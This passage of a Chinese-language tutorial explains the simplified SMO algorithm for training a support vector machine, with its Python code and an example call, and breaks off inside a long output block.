<p>上面是SMO的一个有效版本。在Python中，因为我们代码很长，所以使用了<code>\</code>结尾来表示一行代码。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div></pre></td><td class="code"><pre><div class="line">def smoSimple(dataMatIn, classLabels, C, toler, maxIter):</div><div class="line">    dataMatrix = mat(dataMatIn); labelMat = mat(classLabels).transpose()</div><div class="line">    b = 0; m,n = shape(dataMatrix)</div><div class="line">    alphas = mat(zeros((m,1)))</div><div class="line">    iter = 0</div><div class="line">    while (iter &lt; maxIter):</div><div class="line">        alphaPairsChanged = 0</div><div class="line">        for i in range(m):</div><div class="line">            fXi = float(multiply(alphas,labelMat).T*(dataMatrix*dataMatrix[i,:].T)) + b</div><div class="line">            Ei = fXi - float(labelMat[i])#if checks if an example violates KKT conditions</div><div class="line">            if ((labelMat[i]*Ei &lt; -toler) and (alphas[i] &lt; C)) or ((labelMat[i]*Ei &gt; toler) and (alphas[i] &gt; 0)):</div><div class="line">                j = selectJrand(i,m)</div><div class="line">                fXj = float(multiply(alphas,labelMat).T*(dataMatrix*dataMatrix[j,:].T)) + b</div><div class="line">                Ej = fXj - float(labelMat[j])</div><div class="line">                alphaIold = alphas[i].copy(); alphaJold = alphas[j].copy();</div><div class="line">                if (labelMat[i] != labelMat[j]):</div><div class="line">                    L = max(0, alphas[j] - alphas[i])</div><div class="line">                    H = min(C, C + alphas[j] - alphas[i])</div><div class="line">                else:</div><div class="line">                    L = max(0, alphas[j] + alphas[i] - C)</div><div class="line">                    H = min(C, alphas[j] + alphas[i])</div><div class="line">                if L==H: print &quot;L==H&quot;; continue</div><div class="line">                eta = 2.0 * dataMatrix[i,:]*dataMatrix[j,:].T - dataMatrix[i,:]*dataMatrix[i,:].T - dataMatrix[j,:]*dataMatrix[j,:].T</div><div class="line">                if eta &gt;= 0: print &quot;eta&gt;=0&quot;; continue</div><div class="line">                alphas[j] -= labelMat[j]*(Ei - Ej)/eta</div><div class="line">                alphas[j] = clipAlpha(alphas[j],H,L)</div><div class="line">                if (abs(alphas[j] - alphaJold) &lt; 0.00001): print &quot;j not moving enough&quot;; continue</div><div class="line">                alphas[i] += labelMat[j]*labelMat[i]*(alphaJold - alphas[j])#update i by the same amount as j</div><div class="line">                                                                        #the update is in the oppostie direction</div><div class="line">                b1 = b - Ei- labelMat[i]*(alphas[i]-alphaIold)*dataMatrix[i,:]*dataMatrix[i,:].T - labelMat[j]*(alphas[j]-alphaJold)*dataMatrix[i,:]*dataMatrix[j,:].T</div><div class="line">                b2 = b - Ej- labelMat[i]*(alphas[i]-alphaIold)*dataMatrix[i,:]*dataMatrix[j,:].T - labelMat[j]*(alphas[j]-alphaJold)*dataMatrix[j,:]*dataMatrix[j,:].T</div><div class="line">                if (0 &lt; alphas[i]) and (C &gt; alphas[i]): b = b1</div><div class="line">                elif (0 &lt; alphas[j]) and (C &gt; alphas[j]): b = b2</div><div class="line">                else: b = (b1 + b2)/2.0</div><div class="line">                alphaPairsChanged += 1</div><div class="line">                print &quot;iter: %d i:%d, pairs changed %d&quot; % (iter,i,alphaPairsChanged)</div><div class="line">        if (alphaPairsChanged == 0): iter += 1</div><div class="line">        else: iter = 0</div><div class="line">        print &quot;iteration number: %d&quot; % iter</div><div class="line">    return b,alphas</div></pre></td></tr></table></figure></p>
<p>这个函数非常大。其具有5个输入参数，分别是数据集、类别标签、常数C、容错率和退出前的最大循环次数。</p>
<p>在每次循环中，将<code>alphaPairsChanged</code>设为0，然后再对整个集合顺序遍历。变量<code>alphaPairsChanged</code>用于记录alpha是否进行优化。当然，在循环结束的时候就可以得知这一点。首先，<code>fXi</code>能够计算出来，这就是我们预测的类别。然后，基于这个实例的预测结果和真实结果的比对，就可以计算出误差<code>Ei</code>。如果误差很大，那么可以对该数据实例所对应的<code>alpha</code>值进行优化。在<code>if</code>语句中，不论是正间隔还是负间隔都会被测试。并且在该<code>if</code>语句中，也要同事检查<code>alpha</code>值，以保证其不等于0或者C。由于后面<code>alpha</code>小于0或者大于C会被调整成0或者C，所以一旦在if语句之中他们等于这两个值的话，他们已经就在边界上了，是不值得对其进行优化的。</p>
<p>接下来，可以利用辅助函数来随机选择另一个<code>alpha</code>值，也就是<code>alpha[j]</code>。同样的，可以采用第一个<code>alpha</code>值（<code>alpha[i]</code>）的误差计算方法，来计算这个<code>alpha</code>值的误差。这个过程可以通过<code>copy()</code>的方法来实现，因此稍后可以将新的<code>alpha</code>值和老的<code>alpha</code>值进行比较，Python会通过引用的方式来传递所有的列表，所以必须明确的告知Python要为<code>alphaIold</code>和<code>alphaJold</code>分配新的内存，否则的话，再对新值和旧值进行比较的时候，就看不到新旧值的变化。之后我们开始计算L和H，他们用于将<code>alpha[j]</code>调整在0和C之间，如果L=H，就不做任何改变，直接执行<code>continue</code>语句。这在Python中，则意味着本次循环结束直接运行下一次的for循环。</p>
<p><code>Eta</code>是<code>alpha[j]</code>的最优修改值。如果其为0，那就是说需要退出for循环的当前迭代过程。这个过程对真实的算法进行了简化处理。如果<code>eta</code>为0，那么计算新的<code>alpha[j]</code>就比较麻烦了。然而现实中这种情况却很少发生，因此我们这里忽略这个情况。于是可以计算出一个新的<code>alpha[j]</code>。</p>
<p>然后，就是需要检查<code>alpha[j]</code>是否有轻微的改变。如果是的话，就需要退出for循环，然后同时改变<code>alpha[i]</code>和<code>alpha[j]</code>，虽然改变的大小一样，但是方向却正好相反。经过优化之后，就可以队这两个<code>alpha</code>值设定一个常数值。</p>
<p>最后，在优化过程结束的同时，必须确保在合适的时机结束循环。如果程序执行到for循环的最后一行都不执行continue语句，那么就已经成功的改变了一对<code>alpha</code>，同时可以增加<code>alphaPairsChanged</code>的值。在for循环以外，需要检查<code>alpha</code>值是否已经做了更新，如果有更新则设定<code>iter</code>为0后继续运行程序。只有在所有数据集上遍历<code>maxIter</code>次，且不在发生任何<code>alpha</code>修改后，程序才会停止并且退出<code>while</code>循环。</p>
<p>所以可以执行命令<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>b,alphas=svmMLiA.smoSimple(dataArr,labelArr,<span class="number">0.6</span>,<span class="number">0.001</span>,<span class="number">40</span>)</div></pre></td></tr></table></figure></p>
<p>然后会输出：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div><div class="line">178</div><div class="line">179</div><div class="line">180</div><div class="line">181</div><div class="line">182</div><div class="line">183</div><div class="line">184</div><div class="line">185</div><div class="line">186</div><div class="line">187</div><div class="line">188</div><div class="line">189</div><div class="line">190</div><div class="line">191</div><div class="line">192</div><div class="line">193</div><div class="line">194</div><div class="line">195</div><div class="line">196</div><div class="line">197</div><div class="line">198</div><div class="line">199</div><div class="line">200</div><div class="line">201</div><div class="line">202</div><div class="line">203</div><div class="line">204</div><div class="line">205</div><div class="line">206</div><div class="line">207</div><div class="line">208</div><div class="line">209</div><div class="line">210</div><div class="line">211</div><div class="line">212</div><div class="line">213</div><div class="line">214</div><div class="line">215</div><div class="line">216</div><div class="line">217</div><div class="line">218</div><div class="line">219</div><div class="line">220</div><div class="line">221</div><div class="line">222</div><div class="line">223</div><div class="line">224</div><div class="line">225</div><div class="line">226</div><div class="line">227</div><div class="line">228</div><div class="line">229</div><div class="line">230</div><div class="line">231</div><div class="line">232</div><div class="line">233</div><div class="line">234</div><div class="line">235</div><div class="line">236</div><div class="line">237</div><div class="line">238</div><div class="line">239</div><div class="line">240</div><div class="line">241</div><div class="line">242</div><div class="line">243</div><div class="line">244</div><div class="line">245</div><div class="line">246</div><div class="line">247</div><div class="line">248</div><div class="line">249</div><div class="line">250</div><div class="line">251</div><div class="line">252</div><div class="line">253</div><div class="line">254</div><div class="line">255</div><div class="line">256</div><div class="line">257</div><div class="line">258</div><div class="line">259</div><div class="line">260</div><div class="line">261</div><div class="line">262</div><div class="line">263</div><div class="line">264</div><div class="line">265</div><div class="line">266</div><div class="line">267</div><div class="line">268</div><div class="line">269</div><div class="line">270</div><div class="line">271</div><div class="line">272</div><div class="line">273</div><div class="line">274</div><div class="line">275</div><div class="line">276</div><div class="line">277</div><div class="line">278</div><div class="line">279</div><div class="line">280</div><div class="line">281</div><div class="line">282</div><div class="line">283</div><div class="line">284</div><div class="line">285</div><div class="line">286</div><div class="line">287</div><div class="line">288</div><div class="line">289</div><div class="line">290</div><div class="line">291</div><div class="line">292</div><div class="line">293</div><div class="line">294</div><div class="line">295</div><div class="line">296</div><div class="line">297</div><div class="line">298</div><div class="line">299</div><div class="line">300</div><div class="line">301</div><div class="line">302</div><div class="line">303</div><div class="line">304</div><div class="line">305</div><div class="line">306</div><div class="line">307</div><div class="line">308</div><div class="line">309</div><div class="line">310</div><div class="line">311</div><div class="line">312</div><div class="line">313</div><div class="line">314</div><div class="line">315</div><div class="line">316</div><div class="line">317</div><div class="line">318</div><div class="line">319</div><div class="line">320</div><div class="line">321</div><div class="line">322</div><div class="line">323</div><div class="line">324</div><div class="line">325</div><div class="line">326</div><div class="line">327</div><div class="line">328</div><div class="line">329</div><div class="line">330</div><div class="line">331</div><div class="line">332</div><div class="line">333</div><div class="line">334</div><div class="line">335</div><div class="line">336</div><div class="line">337</div><div class="line">338</div><div class="line">339</div><div class="line">340</div><div class="line">341</div><div class="line">342</div><div class="line">343</div><div class="line">344</div><div class="line">345</div><div class="line">346</div><div class="line">347</div><div class="line">348</div><div class="line">349</div><div class="line">350</div><div class="line">351</div><div class="line">352</div><div class="line">353</div><div class="line">354</div><div class="line">355</div><div class="line">356</div><div class="line">357</div><div class="line">358</div><div class="line">359</div><div class="line">360</div><div class="line">361</div><div class="line">362</div><div class="line">363</div><div class="line">364</div><div class="line">365</div><div class="line">366</div><div class="line">367</div><div class="line">368</div><div class="line">369</div><div class="line">370</div><div class="line">371</div><div class="line">372</div><div class="line">373</div><div class="line">374</div><div class="line">375</div><div class="line">376</div><div class="line">377</div><div class="line">378</div><div class="line">379</div><div class="line">380</div><div class="line">381</div><div class="line">382</div><div class="line">383</div><div class="line">384</div><div class="line">385</div><div class="line">386</div><div class="line">387</div><div class="line">388</div><div class="line">389</div><div class="line">390</div><div class="line">391</div><div class="line">392</div><div class="line">393</div><div class="line">394</div><div class="line">395</div><div class="line">396</div><div class="line">397</div><div class="line">398</div><div class="line">399</div><div class="line">400</div><div class="line">401</div><div class="line">402</div><div class="line">403</div><div class="line">404</div><div class="line">405</div><div class="line">406</div><div class="line">407</div><div class="line">408</div><div class="line">409</div><div class="line">410</div><div class="line">411</div><div class="line">412</div><div class="line">413</div><div class="line">414</div><div class="line">415</div><div class="line">416</div><div class="line">417</div><div class="line">418</div><div class="line">419</div><div class="line">420</div><div class="line">421</div><div class="line">422</div><div class="line">423</div><div class="line">424</div><div class="line">425</div><div class="line">426</div><div class="line">427</div><div class="line">428</div><div class="line">429</div><div class="line">430</div><div class="line">431</div><div class="line">432</div><div class="line">433</div><div class="line">434</div><div class="line">435</div><div class="line">436</div><div class="line">437</div><div class="line">438</div><div class="line">439</div><div class="line">440</div><div class="line">441</div><div class="line">442</div><div class="line">443</div><div class="line">444</div><div class="line">445</div><div class="line">446</div><div class="line">447</div><div class="line">448</div><div class="line">449</div><div class="line">450</div><div class="line">451</div><div class="line">452</div><div class="line">453</div><div class="line">454</div><div class="line">455</div><div class="line">456</div><div class="line">457</div><div class="line">458</div><div class="line">459</div><div class="line">460</div><div class="line">461</div><div class="line">462</div><div class="line">463</div><div class="line">464</div><div class="line">465</div><div class="line">466</div><div class="line">467</div><div class="line">468</div><div class="line">469</div><div class="line">470</div><div class="line">471</div><div class="line">472</div><div class="line">473</div><div class="line">474</div><div class="line">475</div><div class="line">476</div><div class="line">477</div><div class="line">478</div><div class="line">479</div><div class="line">480</div><div class="line">481</div><div class="line">482</div><div class="line">483</div><div class="line">484</div><div class="line">485</div><div class="line">486</div><div class="line">487</div><div class="line">488</div><div class="line">489</div><div class="line">490</div><div class="line">491</div><div class="line">492</div><div class="line">493</div><div class="line">494</div><div class="line">495</div><div class="line">496</div><div class="line">497</div><div class="line">498</div><div class="line">499</div><div class="line">500</div><div class="line">501</div><div class="line">502</div><div class="line">503</div><div class="line">504</div><div class="line">505</div><div class="line">506</div><div class="line">507</div><div class="line">508</div><div class="line">509</div><div class="line">510</div><div class="line">511</div><div class="line">512</div><div class="line">513</div><div class="line">514</div><div class="line">515</div><div class="line">516</div><div class="line">517</div><div class="line">518</div><div class="line">519</div><div class="line">520</div><div class="line">521</div><div class="line">522</div><div class="line">523</div><div class="line">524</div><div class="line">525</div><div class="line">526</div><div class="line">527</div><div class="line">528</div><div class="line">529</div><div class="line">530</div><div class="line">531</div><div class="line">532</div><div class="line">533</div><div class="line">534</div><div class="line">535</div><div class="line">536</div><div class="line">537</div><div class="line">538</div><div class="line">539</div><div class="line">540</div><div class="line">541</div><div class="line">542</div><div class="line">543</div><div class="line">544</div><div class="line">545</div><div class="line">546</div><div class="line">547</div><div class="line">548</div><div class="line">549</div><div class="line">550</div><div class="line">551</div><div class="line">552</div><div class="line">553</div><div class="line">554</div><div class="line">555</div><div class="line">556</div><div class="line">557</div><div class="line">558</div><div class="line">559</div><div class="line">560</div><div class="line">561</div><div class="line">562</div><div class="line">563</div><div class="line">564</div><div class="line">565</div><div class="line">566</div><div class="line">567</div><div class="line">568</div><div class="line">569</div><div class="line">570</div><div class="line">571</div><div class="line">572</div><div class="line">573</div><div class="line">574</div><div class="line">575</div><div class="line">576</div><div class="line">577</div><div class="line">578</div><div class="line">579</div><div class="line">580</div><div class="line">581</div><div class="line">582</div><div class="line">583</div><div class="line">584</div><div class="line">585</div><div class="line">586</div><div class="line">587</div><div class="line">588</div><div class="line">589</div><div class="line">590</div><div class="line">591</div><div class="line">592</div><div class="line">593</div><div class="line">594</div><div class="line">595</div><div class="line">596</div><div class="line">597</div><div class="line">598</div><div class="line">599</div><div class="line">600</div><div class="line">601</div><div class="line">602</div><div class="line">603</div><div class="line">604</div><div class="line">605</div><div class="line">606</div><div class="line">607</div><div class="line">608</div><div class="line">609</div><div class="line">610</div><div class="line">611</div><div class="line">612</div><div class="line">613</div><div class="line">614</div><div class="line">615</div><div class="line">616</div><div class="line">617</div><div class="line">618</div><div class="line">619</div><div class="line">620</div><div class="line">621</div><div class="line">622</div><div class="line">623</div><div class="line">624</div><div class="line">625</div><div class="line">626</div><div class="line">627</div><div class="line">628</div><div class="line">629</div><div class="line">630</div><div class="line">631</div><div class="line">632</div><div class="line">633</div><div class="line">634</div><div class="line">635</div><div class="line">636</div><div class="line">637</div><div class="line">638</div><div class="line">639</div><div class="line">640</div><div class="line">641</div><div class="line">642</div><div class="line">643</div><div class="line">644</div><div class="line">645</div><div class="line">646</div><div class="line">647</div><div class="line">648</div><div class="line">649</div><div class="line">650</div><div class="line">651</div><div class="line">652</div><div class="line">653</div><div class="line">654</div><div class="line">655</div><div class="line">656</div><div class="line">657</div><div class="line">658</div><div class="line">659</div><div class="line">660</div><div class="line">661</div><div class="line">662</div><div class="line">663</div><div class="line">664</div><div class="line">665</div><div class="line">666</div><div class="line">667</div><div class="line">668</div><div class="line">669</div><div class="line">670</div><div class="line">671</div><div class="line">672</div><div class="line">673</div><div class="line">674</div><div class="line">675</div><div class="line">676</div><div class="line">677</div><div class="line">678</div><div class="line">679</div><div class="line">680</div><div class="line">681</div><div class="line">682</div><div class="line">683</div><div class="line">684</div><div class="line">685</div><div class="line">686</div><div class="line">687</div><div class="line">688</div><div class="line">689</div><div class="line">690</div><div class="line">691</div><div class="line">692</div><div class="line">693</div><div class="line">694</div><div class="line">695</div><div class="line">696</div><div class="line">697</div><div class="line">698</div><div class="line">699</div><div class="line">700</div><div class="line">701</div><div class="line">702</div><div class="line">703</div><div class="line">704</div><div class="line">705</div><div class="line">706</div><div class="line">707</div><div class="line">708</div><div class="line">709</div><div class="line">710</div><div class="line">711</div><div class="line">712</div><div class="line">713</div><div class="line">714</div><div class="line">715</div><div class="line">716</div><div class="line">717</div><div class="line">718</div><div class="line">719</div><div class="line">720</div><div class="line">721</div><div class="line">722</div><div class="line">723</div><div class="line">724</div><div class="line">725</div><div class="line">726</div><div class="line">727</div><div class="line">728</div><div class="line">729</div><div class="line">730</div><div class="line">731</div><div class="line">732</div><div class="line">733</div><div class="line">734</div><div class="line">735</div><div class="line">736</div><div class="line">737</div><div class="line">738</div><div class="line">739</div><div class="line">740</div><div class="line">741</div><div class="line">742</div><div class="line">743</div><div class="line">744</div><div class="line">745</div><div class="line">746</div><div class="line">747</div><div class="line">748</div><div class="line">749</div><div class="line">750</div><div class="line">751</div><div class="line">752</div><div class="line">753</div><div class="line">754</div><div class="line">755</div><div class="line">756</div><div class="line">757</div><div class="line">758</div><div class="line">759</div><div class="line">760</div><div class="line">761</div><div class="line">762</div><div class="line">763</div><div class="line">764</div><div class="line">765</div><div class="line">766</div><div class="line">767</div><div class="line">768</div><div class="line">769</div><div class="line">770</div><div class="line">771</div><div class="line">772</div><div class="line">773</div><div class="line">774</div><div class="line">775</div><div class="line">776</div><div class="line">777</div><div class="line">778</div><div class="line">779</div><div class="line">780</div><div class="line">781</div><div class="line">782</div><div class="line">783</div><div class="line">784</div><div class="line">785</div><div class="line">786</div><div class="line">787</div><div class="line">788</div><div class="line">789</div><div class="line">790</div><div class="line">791</div><div class="line">792</div><div class="line">793</div><div class="line">794</div><div class="line">795</div><div class="line">796</div><div class="line">797</div><div class="line">798</div><div class="line">799</div><div class="line">800</div><div class="line">801</div><div class="line">802</div><div class="line">803</div><div class="line">804</div><div class="line">805</div><div class="line">806</div><div class="line">807</div><div class="line">808</div><div class="line">809</div><div class="line">810</div><div class="line">811</div><div class="line">812</div><div class="line">813</div><div class="line">814</div><div class="line">815</div><div class="line">816</div><div class="line">817</div><div class="line">818</div><div class="line">819</div><div class="line">820</div><div class="line">821</div><div class="line">822</div><div class="line">823</div><div class="line">824</div><div class="line">825</div><div class="line">826</div><div class="line">827</div><div class="line">828</div><div class="line">829</div><div class="line">830</div><div class="line">831</div><div class="line">832</div><div class="line">833</div><div class="line">834</div><div class="line">835</div><div class="line">836</div><div class="line">837</div><div class="line">838</div><div class="line">839</div><div class="line">840</div><div class="line">841</div><div class="line">842</div><div class="line">843</div><div class="line">844</div><div class="line">845</div><div class="line">846</div><div class="line">847</div><div class="line">848</div><div class="line">849</div><div class="line">850</div><div class="line">851</div><div class="line">852</div><div class="line">853</div><div class="line">854</div><div class="line">855</div><div class="line">856</div><div class="line">857</div><div class="line">858</div><div class="line">859</div><div class="line">860</div><div class="line">861</div><div class="line">862</div><div class="line">863</div><div class="line">864</div><div class="line">865</div><div class="line">866</div><div class="line">867</div><div class="line">868</div><div class="line">869</div><div class="line">870</div><div class="line">871</div><div class="line">872</div><div class="line">873</div><div class="line">874</div><div class="line">875</div><div class="line">876</div><div class="line">877</div><div class="line">878</div><div class="line">879</div><div class="line">880</div><div class="line">881</div><div class="line">882</div><div class="line">883</div><div class="line">884</div><div class="line">885</div><div class="line">886</div><div class="line">887</div><div class="line">888</div><div class="line">889</div><div class="line">890</div><div class="line">891</div><div class="line">892</div><div class="line">893</div><div class="line">894</div><div class="line">895</div><div class="line">896</div><div class="line">897</div><div class="line">898</div><div class="line">899</div><div class="line">900</div><div class="line">901</div><div class="line">902</div><div class="line">903</div><div class="line">904</div><div class="line">905</div><div class="line">906</div><div class="line">907</div><div class="line">908</div><div class="line">909</div><div class="line">910</div><div class="line">911</div><div class="line">912</div><div class="line">913</div><div class="line">914</div><div class="line">915</div><div class="line">916</div><div class="line">917</div><div class="line">918</div><div class="line">919</div><div class="line">920</div><div class="line">921</div><div class="line">922</div><div class="line">923</div><div class="line">924</div><div class="line">925</div><div class="line">926</div><div class="line">927</div><div class="line">928</div><div class="line">929</div><div class="line">930</div><div class="line">931</div><div class="line">932</div><div class="line">933</div><div class="line">934</div><div class="line">935</div><div class="line">936</div><div class="line">937</div><div class="line">938</div><div class="line">939</div><div class="line">940</div><div class="line">941</div><div class="line">942</div><div class="line">943</div><div class="line">944</div><div class="line">945</div><div class="line">946</div><div class="line">947</div><div class="line">948</div><div class="line">949</div><div class="line">950</div><div class="line">951</div><div class="line">952</div><div class="line">953</div><div class="line">954</div><div class="line">955</div><div class="line">956</div><div class="line">957</div><div class="line">958</div><div class="line">959</div><div class="line">960</div><div class="line">961</div><div class="line">962</div><div class="line">963</div><div class="line">964</div><div class="line">965</div><div class="line">966</div><div class="line">967</div><div class="line">968</div><div class="line">969</div><div class="line">970</div><div class="line">971</div><div class="line">972</div><div class="line">973</div><div class="line">974</div><div class="line">975</div><div class="line">976</div><div class="line">977</div><div class="line">978</div><div class="line">979</div><div class="line">980</div><div class="line">981</div><div class="line">982</div><div class="line">983</div><div class="line">984</div><div class="line">985</div><div class="line">986</div><div class="line">987</div><div class="line">988</div><div class="line">989</div><div class="line">990</div><div class="line">991</div><div class="line">992</div><div class="line">993</div><div class="line">994</div><div class="line">995</div><div class="line">996</div><div class="line">997</div><div class="line">998</div><div class="line">999</div><div class="line">1000</div><div class="line">1001</div><div class="line">1002</div><div class="line">1003</div><div class="line">1004</div><div class="line">1005</div><div class="line">1006</div><div class="line">1007</div><div class="line">1008</div><div class="line">1009</div><div class="line">1010</div><div class="line">1011</div><div class="line">1012</div><div class="line">1013</div><div class="line">1014</div><div class="line">1015</div><div class="line">1016</div><div class="line">1017</div><div class="line">1018</div><div class="line">1019</div><div class="line">1020</div><div class="line">1021</div><div class="line">1022</div><div class="line">1023</div><div class="line">1024</div><div class="line">1025</div><div class="line">1026</div><div class="line">1027</div><div class="line">1028</div><div class="line">1029</div><div class="line">1030</div><div class="line">1031</div><div class="line">1032</div><div class="line">1033</div><div class="line">1034</div><div class="line">1035</div><div class="line">1036</div><div class="line">1037</div><div class="line">1038</div><div class="line">1039</div><div class="line">1040</div><div class="line">1041</div><div class="line">1042</div><div class="line">1043</div><div class="line">1044</div><div class="line">1045</div><div class="line">1046</div><div class="line">1047</div><div class="line">1048</div><div class="line">1049</div><div class="line">1050</div><div class="line">1051</div><div class="line">1052</div><div class="line">1053</div><div class="line">1054</div><div class="line">1055</div><div class="line">1056</div><div class="line">1057</div><div class="line">1058</div><div class="line">1059</div><div class="line">1060</div><div class="line">1061</div><div class="line">1062</div><div class="line">1063</div><div class="line">1064</div><div class="line">1065</div><div class="line">1066</div><div class="line">1067</div><div class="line">1068</div><div class="line">1069</div><div class="line">1070</div><div class="line">1071</div><div class="line">1072</div><div class="line">1073</div><div class="line">1074</div><div class="line">1075</div><div class="line">1076</div><div class="line">1077</div><div class="line">1078</div><div class="line">1079</div><div class="line">1080</div><div class="line">1081</div><div class="line">1082</div><div class="line">1083</div><div class="line">1084</div><div class="line">1085</div><div class="line">1086</div><div class="line">1087</div><div class="line">1088</div><div class="line">1089</div><div class="line">1090</div><div class="line">1091</div><div class="line">1092</div><div class="line">1093</div><div class="line">1094</div><div class="line">1095</div><div class="line">1096</div><div class="line">1097</div><div class="line">1098</div><div class="line">1099</div><div class="line">1100</div><div class="line">1101</div><div class="line">1102</div><div class="line">1103</div><div class="line">1104</div><div class="line">1105</div><div class="line">1106</div><div class="line">1107</div><div class="line">1108</div><div class="line">1109</div><div class="line">1110</div><div class="line">1111</div><div class="line">1112</div><div class="line">1113</div><div class="line">1114</div><div class="line">1115</div><div class="line">1116</div><div class="line">1117</div><div class="line">1118</div><div class="line">1119</div><div class="line">1120</div><div class="line">1121</div><div class="line">1122</div><div class="line">1123</div><div class="line">1124</div><div class="line">1125</div><div class="line">1126</div><div class="line">1127</div><div class="line">1128</div><div class="line">1129</div><div class="line">1130</div><div class="line">1131</div><div class="line">1132</div><div class="line">1133</div><div class="line">1134</div><div class="line">1135</div><div class="line">1136</div><div class="line">1137</div><div class="line">1138</div><div class="line">1139</div><div class="line">1140</div><div class="line">1141</div><div class="line">1142</div><div class="line">1143</div><div class="line">1144</div><div class="line">1145</div><div class="line">1146</div><div class="line">1147</div><div class="line">1148</div><div class="line">1149</div><div class="line">1150</div><div class="line">1151</div><div class="line">1152</div><div class="line">1153</div><div class="line">1154</div><div class="line">1155</div><div class="line">1156</div><div class="line">1157</div><div class="line">1158</div><div class="line">1159</div><div class="line">1160</div><div class="line">1161</div><div class="line">1162</div><div class="line">1163</div><div class="line">1164</div><div class="line">1165</div><div class="line">1166</div><div class="line">1167</div><div class="line">1168</div><div class="line">1169</div><div class="line">1170</div><div class="line">1171</div><div class="line">1172</div><div class="line">1173</div><div class="line">1174</div><div class="line">1175</div><div class="line">1176</div><div class="line">1177</div><div class="line">1178</div><div class="line">1179</div><div class="line">1180</div><div class="line">1181</div><div class="line">1182</div><div class="line">1183</div><div class="line">1184</div><div class="line">1185</div><div class="line">1186</div><div class="line">1187</div><div class="line">1188</div><div class="line">1189</div><div class="line">1190</div><div class="line">1191</div><div class="line">1192</div><div class="line">1193</div><div class="line">1194</div><div class="line">1195</div><div class="line">1196</div><div class="line">1197</div><div class="line">1198</div><div class="line">1199</div><div class="line">1200</div><div class="line">1201</div><div class="line">1202</div><div class="line">1203</div><div class="line">1204</div><div class="line">1205</div><div class="line">1206</div><div class="line">1207</div><div class="line">1208</div><div class="line">1209</div><div class="line">1210</div><div class="line">1211</div><div class="line">1212</div><div class="line">1213</div><div class="line">1214</div><div class="line">1215</div><div class="line">1216</div><div class="line">1217</div><div class="line">1218</div><div class="line">1219</div><div class="line">1220</div><div class="line">1221</div><div class="line">1222</div><div class="line">1223</div><div class="line">1224</div><div class="line">1225</div><div class="line">1226</div><div class="line">1227</div><div class="line">1228</div><div class="line">1229</div><div class="line">1230</div><div class="line">1231</div><div class="line">1232</div><div class="line">1233</div><div class="line">1234</div><div class="line">1235</div><div class="line">1236</div><div class="line">1237</div><div class="line">1238</div><div class="line">1239</div><div class="line">1240</div><div class="line">1241</div><div class="line">1242</div><div class="line">1243</div><div class="line">1244</div><div 